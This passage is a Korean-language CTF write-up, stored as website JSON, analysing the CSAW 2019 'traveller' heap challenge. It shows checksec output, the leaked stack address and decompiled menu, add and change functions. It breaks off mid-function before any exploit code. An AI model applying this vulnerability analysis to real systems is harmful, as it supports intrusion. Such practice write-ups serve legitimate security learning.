{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/csaw2019_travelle_ctf_writeup/",
    "result": {"data":{"cur":{"id":"8880760b-3ccd-50c9-b8e4-3779cab3598b","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-개요\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\" aria-label=\"바이너리 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 개요</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>traveller<span class=\"token operator\">:</span> ELF <span class=\"token number\">64</span><span class=\"token operator\">-</span>bit LSB executable\nx86<span class=\"token operator\">-</span><span class=\"token number\">64</span>\nversion <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>SYSV<span class=\"token punctuation\">)</span>\ndynamically linked\ninterpreter <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span>\n<span class=\"token keyword\">for</span> GNU<span class=\"token operator\">/</span>Linux <span class=\"token number\">2.6</span><span class=\"token punctuation\">.</span><span class=\"token number\">32</span>\nBuildID<span class=\"token punctuation\">[</span>sha1<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>b551cbb805a21e18393c3816ffd28dfb11b1ff1e\nwith debug_info\n<span class=\"token operator\">not</span> stripped\n\nlinux<span class=\"token operator\">-</span>vdso<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">1</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffe8fb89000</span><span class=\"token punctuation\">)</span>\nlibc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>x86_64<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>gnu<span class=\"token operator\">/</span>libc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007f7aeab6c000</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007f7aeaf5d000</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"보호기법\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\" aria-label=\"보호기법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보호기법</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ checksec \nCANARY    <span class=\"token operator\">:</span> disabled\nFORTIFY   <span class=\"token operator\">:</span> disabled\nNX        <span class=\"token operator\">:</span> ENABLED\nPIE       <span class=\"token operator\">:</span> disabled\nRELRO     <span class=\"token operator\">:</span> Partial</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">trip 구조체\n<span class=\"token operator\">=</span><span class=\"token operator\">></span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> destination\n<span class=\"token operator\">=</span><span class=\"token operator\">></span>ssize_t distance\n\n<span class=\"token operator\">--</span> global variables <span class=\"token operator\">--</span>\nTRIPS_NUM <span class=\"token operator\">=</span> <span class=\"token number\">7</span>\nTOTAL_RUN <span class=\"token operator\">=</span> <span class=\"token number\">14</span>\ntrip<span class=\"token operator\">*</span> trips<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span>\ntIndex <span class=\"token operator\">=</span> <span class=\"token number\">0</span></code></pre></div>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nHello! Welcome to trip management system. \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%p \\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> choice<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> choice_num<span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nChoose an option: \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n1. Add a trip \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2. Change a trip \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"3. Delete a trip \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"4. Check a trip \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tchoice_num <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>choice_num<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span>\n\t\t\t<span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span>\n\t\t\t<span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span>\n\t\t\t<span class=\"token function\">delet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span>\n\t\t\t<span class=\"token function\">getTrip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>argc 스택 주소가 노출되는 것을 확인할 수 있으며, 총 4개의 메뉴를 선택할 수 있다.</li>\n<li>Add 메뉴는 동적 할당을 진행한다.</li>\n<li>Change는 해당 할당되어진 값을 변경한다.</li>\n<li>Delete는 해제</li>\n<li>Check는 할당된 값을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"add-함수\" style=\"position:relative;\"><a href=\"#add-%ED%95%A8%EC%88%98\" aria-label=\"add 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>add 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">char</span> choice<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> choice_num<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tIndex <span class=\"token operator\">==</span> TRIPS_NUM<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Cannot add more trips.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Adding new trips...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\ttrip <span class=\"token operator\">*</span>newTrip <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>trip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Choose a Distance: \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1. 0x80 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2. 0x110 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"3. 0x128 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"4. 0x150 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"5. 0x200 \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tchoice_num <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>choice_num<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x80\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x110\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x128\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x150\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span>\n\t\tnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x200\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Destination: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Can't you count?\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Trip %lu added.\\n\"</span><span class=\"token punctuation\">,</span> tIndex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\ttrips<span class=\"token punctuation\">[</span>tIndex<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> newTrip<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>add func &#x3C;1:0x80, 2:0x110, 3:0x128, 4:0x150, 5:0x200></li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token operator\">-></span> choice<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span>\n<span class=\"token operator\">-></span> tIndex <span class=\"token operator\">==</span> <span class=\"token number\">7</span> <span class=\"token operator\">-></span> <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> tcache<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token operator\">-></span> trip <span class=\"token operator\">*</span>newTrip <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>trip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>size를 선택해서 그 사이즈를 통해 동적 할당</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">~</span><span class=\"token number\">5</span>\nnewTrip<span class=\"token operator\">-></span>distance <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token operator\">~</span><span class=\"token number\">5</span><span class=\"token operator\">></span>\nnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>newTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span>\nnewTrip<span class=\"token operator\">-></span>destination <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> size<span class=\"token operator\">-</span><span class=\"token number\">1</span> 만큼 데이터 입력 <span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>add func 마지막 tIndex 증가 배열 설정한 구조체 대입 <code class=\"language-text\">[tIndex++] = newTrip</code></li>\n</ul>\n<h2 id=\"change-함수\" style=\"position:relative;\"><a href=\"#change-%ED%95%A8%EC%88%98\" aria-label=\"change 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>change 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Update trip: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\tssize_t choice <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>choice <span class=\"token operator\">>=</span> tIndex<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No upcoming trip to update.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\ttrip <span class=\"token operator\">*</span>oldTrip <span class=\"token operator\">=</span> trips<span class=\"token punctuation\">[</span>choice<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n\tssize_t bytes_read <span class=\"token operator\">=</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> oldTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">,</span> oldTrip<span class=\"token operator\">-></span>distance<span class=\"token punctuation\">)</span><span class=\"token 